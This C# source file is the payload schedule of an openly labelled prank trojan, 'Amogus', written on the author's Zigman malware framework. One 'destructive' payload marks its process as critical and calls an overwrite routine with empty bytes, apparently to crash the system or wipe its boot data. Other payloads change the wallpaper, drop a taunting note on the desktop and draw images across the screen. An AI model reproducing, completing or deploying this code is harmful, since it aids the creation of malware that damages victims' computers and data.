// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using System.Diagnostics;
using System.Drawing;
using TheAirBlow.Zigman;
using TheAirBlow.Zigman.Attributes;

namespace TheAirBlow.Amogus;

public class AllPayloads : Payloads
{
    [Payload("destructive", SafetyLevel.Destructive, true)]
    [UseQueue(0, 0)]
    public void DestuctiveStuff()
    {
        MakeProcessCritical();
        Overwrite(Array.Empty<byte>());
    }

    [Payload("init", SafetyLevel.Safe, true)]
    [UseQueue(1, 24000)]
    public void InitializationStuff()
    {
        _monke = Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets\\img_monke.png"));
        _amogus = Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets\\img_amogus.png"));
        
        //var path = Path.Combine(Directory.GetCurrentDirectory(), "assets\\music_amogus.wav");
        //Program.Manager.PlayFile(path, true);
        
        SetWallpaper(Path.Combine(Directory.GetCurrentDirectory(),
            "assets\\img_wallpaper.jpg"), Style.Stretched);
        var note = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "note.txt");
        File.WriteAllText(note, "Haha you just ran Amogus trojan!!1!\r\nRest in piss, forever miss!\r\n\r\nCopyright (C) TheAirBlow 2021" +
                                "\r\nGitHub: https://github.com/theairblow/zigman" +
                                "\r\nVK: https://vk.com/theairblow");
        Process.Start(@"C:\Windows\System32\notepad.exe", note);
    }

    private Image _monke;
    private Image _amogus;

    [Payload("images", SafetyLevel.Safe)]
    [UseQueue(63, 10000)]
    public void AmongusMonkeDraw()
    {
        var x = Random.Next(0, Width);
        var y = Random.Next(0, Height);
        DisplayGraphics.DrawImage(
            Random.Next(0, 100) < 8 
                ? _monke : _amogus, x, y);
        Thread.Sleep(100);
    }

    [Payload("phase1", SafetyLevel.Safe)]
    [UseQueue(64, 10000)]
    public Payloads Phase1()
        => new Phase1();
    
    [Payload("phase2", SafetyLevel.Safe)]
    [UseQueue(65, 10000)]
    public Payloads Phase2()
        => new Phase2();
    
    [Payload("phase3", SafetyLevel.Safe)]
    [UseQueue(66, 10000)]
    public Payloads Phase3()
        => new Phase3();
    
    [Payload("phase4", SafetyLevel.Safe)]
    [UseQueue(67, 10000)]
    public Payloads Phase4()
        => new Phase4();
    
    [Payload("phase5", SafetyLevel.Safe)]
    [UseQueue(68, 10000)]
    public Payloads Phase5()
        => new Phase5();
    
    [Payload("stop", SafetyLevel.Safe, true)]
    [UseQueue(69, 60000)]
    public void StopThisHell()
        => StopAllThreads();
}